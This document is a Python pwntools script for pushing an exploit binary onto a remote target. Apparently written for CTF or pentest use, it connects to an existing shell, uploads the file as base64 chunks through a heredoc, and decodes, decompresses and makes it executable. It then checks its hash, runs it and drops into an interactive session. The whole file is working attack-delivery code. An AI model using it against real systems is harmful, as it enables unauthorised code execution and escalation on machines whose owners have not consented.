from pwn import *
import hashlib
import argparse
import gzip
import string
import random

def generate_delimiter():
    delimiter_chars = string.ascii_uppercase
    delimiter = ''.join(random.choice(list(delimiter_chars)) for _ in range(16))
    return delimiter


def parse_args():
    parser = argparse.ArgumentParser(description="Script to exploit a binary with specified domain/IP and port.")
    parser.add_argument("binary", help="Path to the binary to exploit")
    parser.add_argument("domain", help="Domain or IP address of the target")
    parser.add_argument("port", type=int, help="Port of the target")
    parser.add_argument("-c", "--chunk-size", type=int, default=0x100, help="Chunk size to split the exploit in")
    parser.add_argument("-e", "--exploit-path", default="/tmp/exploit", help="Path to store the exploit on the target")
    parser.add_argument("-s", "--ssl", action="store_true", help="Use SSL to connect to the target")
    parser.add_argument("-d", "--chunk-debug", type=int, default=100, help="Debug every n chunks")
    return parser.parse_args()


if __name__=="__main__":
    args = parse_args()
    binary = args.binary
    with open(binary, "rb") as f:
        exploit = f.read()
    print(f"Binary Path: {args.binary}")
    endpoint = args.domain
    print(f"Target Domain/IP: {endpoint}")
    port = args.port
    print(f"Target Port: {port}")
    ssl = args.ssl
    print(f"SSL: {ssl}")
    exploit_path = args.exploit_path
    print(f"Exploit Path: {exploit_path}")
    chunk_size = args.chunk_size
    print(f"Chunk Size: {chunk_size}")
    chunk_debug = args.chunk_debug
    assert chunk_debug > 0, "Chunk debug must be greater than 0"
    print(f"Chunk Debug: {chunk_debug}")
    # Computing the md5 hash of the exploit
    hash_check = hashlib.md5(exploit).hexdigest()
    print(f"MD5 Hash: {hash_check}")
    # Compressing using gzip
    exploit = gzip.compress(exploit)
    # Encoding the exploit to base64
    exploit = b64e(exploit)
    delimiter = "EOF"
    while delimiter in exploit:
        delimiter = generate_delimiter()
    print(f"Delimiter: {delimiter}")
    # Splitting the base64 in chunks of chunk_size, also considering the last chunk
    chunks = [exploit[i:i+chunk_size] for i in range(0, len(exploit), chunk_size)]
    # Connecting to the target
    print("Connecting to the endpoint...")
    c = remote(endpoint, port, ssl=ssl)
    # Waiting for the prompt
    data = c.recvuntil(b"$ ")
    print("Connected!")
    # Creating the file to store the exploit
    c.sendline(f"echo TEST_FILE >> {exploit_path}".encode())
    c.recvuntil(b"$ ")
    # Testing the file
    c.sendline(f"cat {exploit_path}".encode())
    answer = c.recvuntil(b"$ ")
    if b"TEST_FILE" not in answer:
        print("Could not create the file")
        c.close()
        exit(1)
    # Deleting the file
    c.sendline(f"rm {exploit_path}".encode())
    c.recvuntil(b"$ ")
    # Creating the stream to write the exploit
    c.sendline(f"cat << {delimiter} > {exploit_path}.b64".encode())
    c.recvuntil(f"cat << {delimiter} > {exploit_path}.b64".encode())
    # Writing the exploit in the file
    print(f"Sending exploit... {len(exploit)} bytes ({len(chunks)} chunks)")
    for i, chunk in enumerate(chunks):
        c.sendline(f"{chunk}".encode())
        if (i + 1) % chunk_debug == 0:
            print(f"Chunk {i + 1} / {len(chunks)}")
    print("Exploit sent!")
    print("Receiving all the data... This may take a while...")
    # Closing the stream
    c.sendline(f"{delimiter}".encode())
    c.recvuntil(f"{delimiter}".encode())
    c.recvuntil(b"$ ")
    # Decoding the file
    c.sendline(f"base64 -d {exploit_path}.b64 > {exploit_path}.gz".encode())
    c.recvuntil(b"$ ")
    # Decompressing the file
    c.sendline(f"gunzip {exploit_path}.gz".encode())
    c.recvuntil(b"$ ")
    # Setting the file as executable
    c.sendline(f"chmod +x {exploit_path}".encode())
    c.recvuntil(b"$ ")
    # Checking the md5 hash and running the exploit
    c.sendline(f"echo CHECK; remote_hash=`md5sum {exploit_path} | awk '{{print $1}}'`; [[ $remote_hash = '{hash_check}' ]] && {exploit_path} || echo md5 mismatch: \"$remote_hash but should be {hash_check}\"".encode())
    c.recvuntil(b"CHECK")
    c.recvuntil(b"CHECK")
    answer = c.recvuntil(b"$ ")
    """
    if b"md5 mismatch" in answer:
        print("MD5 mismatch!")
        print(answer)
        c.close()
        exit(1)
    """
    #context.log_level = "debug"
    c.sendline(f"{exploit_path}".encode())
    c.interactive()